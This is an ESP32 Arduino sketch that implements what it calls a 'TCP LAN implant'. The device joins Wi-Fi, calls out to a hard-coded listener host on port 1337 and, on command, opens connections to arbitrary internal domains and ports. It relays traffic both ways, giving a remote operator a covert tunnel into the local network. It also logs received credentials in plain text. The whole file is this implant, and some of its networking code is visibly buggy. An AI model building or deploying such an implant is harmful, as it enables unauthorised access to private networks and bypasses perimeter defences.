#include <WiFi.h>
#include <Arduino.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <FreeRTOS.h>
#include  <freertos/task.h>
#include <esp_task.h>
#include <lwip/sockets.h>
#include <lwip/err.h>
#include <lwip/sys.h>
#include <netdb.h>
#include <fcntl.h>
#include "config.h"

const char* ssid = WLAN_SSID; // edit config.h
const char* password = WLAN_PASS;  //edit config.h

typedef enum {
  PROXYPACKET_NOP = 0x00,
  PROXYPACKET_AUTH = 0xA0,
  PROXYPACKET_AUTHFAIL = 0xAF,
  PROXYPACKET_DATA = 0xD0,
  PROXYPACKET_ENDRESPONSE = 0xDE
} ProxyPacketType;

typedef struct ProxyPacketHeader {
  ProxyPacketType packetType;
} ProxyPacketHeader_t;

typedef struct ProxyPacketAuth {
  const char loginName[256];
  const char loginPassword[256];
} ProxyPacketAuth_t;

typedef struct ProxyPacket {
  uint32_t packetLength;
  char domain[253];
  uint16_t port;
} ProxyPacket_t;

int createIPv4Socket(const char *domain, uint16_t port) {

  int fd = -1;
  struct sockaddr_in sa = {};
  struct hostent* ent = NULL;
  char IPv4Address[INET_ADDRSTRLEN];

  Serial.println("Resolving DNS to IPv4...");
  if( !(ent = gethostbyname(domain)) ) {
    Serial.printf("DNS resolution failed for %s\n", domain);
    return -1;
  }
  
  if(ent->h_addrtype != AF_INET) {
    Serial.printf("The domain %s uses IPv6 where IPv4 is required.\n", domain);
    return -1;
  }

  bcopy((struct sockaddr_in *) ent->h_addr_list[0], &sa.sin_addr, sizeof(struct sockaddr_in));

  inet_ntop(AF_INET, &(sa.sin_addr.s_addr), IPv4Address, INET_ADDRSTRLEN);
  Serial.printf("DNS resolved: %s: %s\n", domain, IPv4Address);
  
  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);

  fd = socket(AF_INET, SOCK_STREAM, 0);
  if(fd < 0) {
    Serial.println("Failed to create socket.");
  }

  struct timeval tv;

  tv.tv_sec = 30;  /* 30 Secs Timeout */
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO,(struct timeval *)&tv,sizeof(struct timeval));

  /* Connect to the server */
  int attempt = 0;
  Serial.printf("Connecting to %s[%s]...\n", domain, IPv4Address);
  while (true) {
    if( connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0 ) {
      Serial.println("Failed to connect to server.");
      attempt++;
      if(attempt < 3) {
        Serial.println("Retrying...");
        continue;
      }
      else {
        Serial.printf("Failed to connect to %s[%s]: Maximum retries exceeded, giving up.\n", domain, IPv4Address);
        close(fd);
        return -1;
      }
      delay(5000); // Wait 5 seconds, then retry
    }
    Serial.printf("Connected to %s[%s]:%d!\n", domain, IPv4Address, port);
    break;
  }

  return fd;
}



int receiveProxyAuthPacket(int sock) {
  ProxyPacketAuth_t auth = {};
  ssize_t nRead = read(sock, &auth, sizeof(ProxyPacketAuth_t));

  switch(nRead) {
    case -1:
      Serial.println("An error occured receiving the proxy packet :(");
      return -1;
    case 0:
      Serial.println("The socket has disconnected :(");
      return 0;
    
    default:
      if(nRead != sizeof(ProxyPacketAuth_t)) {
        Serial.println("Received invalid Proxy Packet Header.");
        return -1;
      }
      Serial.println("Received proxy auth packet!");
      Serial.printf("Username = %s, Password = %s\n", auth.loginName, auth.loginPassword);
      break;
  } 
  return nRead;
}

int receiveProxyDataPacket(int sock) {
  ProxyPacket_t proxyPacket = {};
  ssize_t nRead = read(sock, &proxyPacket, sizeof(ProxyPacket_t));

  switch(nRead) {
    case -1:
      Serial.println("An error occured receiving the proxy packet :(");
      return -1;
    case 0:
      Serial.println("The socket has disconnected :(");
      return 0;
    
    default:
      if(nRead != sizeof(ProxyPacket_t)) {
        Serial.println("Received invalid Proxy Packet Header.");
        return -1;
      }
      Serial.println("Received proxy data packet!");
      Serial.printf("domain = %s, port = %d\n", proxyPacket.domain, proxyPacket.port);

      int targetSock = createIPv4Socket(proxyPacket.domain, proxyPacket.port);

      if(targetSock < 0) {
        Serial.printf("Could not connect to: %s:%d\n", proxyPacket.domain, proxyPacket.port);
        return -1;
      }

      if(proxyPacket.packetLength) {

        // Read small chunk
        if(proxyPacket.packetLength < 256) {
          char buffer[proxyPacket.packetLength];
          nRead = read(sock, buffer, proxyPacket.packetLength);
          Serial.printf("Received: \n");
          for(int i = 0; i < proxyPacket.packetLength; i++) {
            Serial.printf("%02x ", buffer[i]);
          }
          Serial.printf("\n\n");
          write(targetSock, buffer, nRead);
          
        }
        else {

          // Read large chunks
          char buffer[256];
          int len = proxyPacket.packetLength;
          while(len > 0) {
            if(len >= 256) {
              nRead = read(sock, buffer, 256);
              Serial.printf("Received: \n");
              for(int i = 0; i < 256; i+=4) {
                Serial.printf("%c%c%c%c %02x %02x %02x %02x \n", buffer[i], buffer[i+1], buffer[i+2], buffer[i+3], buffer[i], buffer[i+1], buffer[i+2], buffer[i+3]);
              }
              Serial.printf("\n\n");
              len -= 256;
              write(targetSock, buffer, nRead);
            }
            else {
              nRead = read(sock, buffer, len);
              Serial.printf("Received: \n");
              for(int i = 0; i < len; i++) {
                Serial.printf("%c %02x \n", buffer[i],  buffer[i]);
              }
              write(targetSock, buffer, len);
              Serial.printf("\n\n");
              len = 0;
            }
          }
        }

        char buffer[256];

        Serial.println("Receiving response from target...\n");
        ProxyPacketHeader_t hdr = {};
        hdr.packetType = PROXYPACKET_DATA;

        ProxyPacket_t responsePacket = {};
        responsePacket.packetLength = 256;
        responsePacket.port = proxyPacket.port;
        memcpy(responsePacket.domain, proxyPacket.domain, sizeof(responsePacket.domain));

        while( (nRead = read(targetSock, buffer, 256)) > 0)
        {
          Serial.printf("Got %d bytes from target...\n", nRead);
          responsePacket.packetLength = nRead;
          write(sock, &hdr, sizeof(ProxyPacketHeader_t));
          write(sock, &responsePacket, sizeof(ProxyPacket_t));
          write(sock, buffer, responsePacket.packetLength);
          bzero(buffer, 256);
        }

        Serial.printf("Sending EOF packet..\n");
        hdr.packetType = PROXYPACKET_ENDRESPONSE;
        write(sock, &hdr, sizeof(ProxyPacketHeader_t));
      }
      if(targetSock >= 0) {
        close(targetSock);
      }
      
      break;
  } 
  return nRead;
}


int receiveProxyPacket(int sock) {
  
  ProxyPacketHeader_t hdr = {};
  ssize_t nRead = read(sock, &hdr, sizeof(ProxyPacketHeader_t));

  switch(nRead) {
    case -1:
      Serial.println("An error occured receiving the proxy packet :(");
      return -1;
    case 0:
      Serial.println("The socket has disconnected :(");
      return 0;
    
    default:
      if(nRead != sizeof(ProxyPacketHeader_t)) {
        Serial.println("Received invalid Proxy Packet Header.");
        return -1;
      }
      Serial.println("Received proxy packet header!");
      break;
  } 

  switch(hdr.packetType) {

    case PROXYPACKET_NOP:
      Serial.println("Received null-operation packet.");
      break;

    case PROXYPACKET_AUTH:
      Serial.println("Received authentication packet.");
      nRead = receiveProxyAuthPacket(sock);
      break;

    case PROXYPACKET_DATA:
      Serial.println("Received data packet.");
      nRead = receiveProxyDataPacket(sock);
      break;

    default:
      Serial.printf("Received invalid packet, type=%d", hdr.packetType);
      break;
  }
  return nRead;
}


int runTCPLANImplant(const char* listenerDomain, uint16_t listenerPort)
{
  int listenerSock = -1;
  
  listenerSock = createIPv4Socket(listenerDomain, listenerPort);
  if(listenerSock < 0) {
    Serial.println("Failed to create socket for listener server.");
    return -1;
  }

  while(true) {
    int rc = receiveProxyPacket(listenerSock);
    if( rc == -1) {
      close(listenerSock);
      return -1;
    }
    else if( rc == 0) {
      close(listenerSock);
      return 0;
    }
  }

  return 1;
}

void setup() {

  // Start serial
  while(!Serial){}
  Serial.begin(9600);

  // Wait for Wi-Fi connectivity 
  WiFi.begin(ssid, password);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.println("Connecting to WiFi..");
  }
  
}

int errorCount = 0;

void loop() {
  Serial.println("Starting TCP tunnel.\n");
  int err = runTCPLANImplant("cia.gov", 1337);
  if(err == -1) {
    errorCount++;
  }
  else {
    errorCount = 0;
  }

  if(errorCount > 10) {
    Serial.printf("Tried to many times. A hero has died on the battlefield :(\n");
    while(true){
      delay(100);
    }
  }

  delay(10000);
}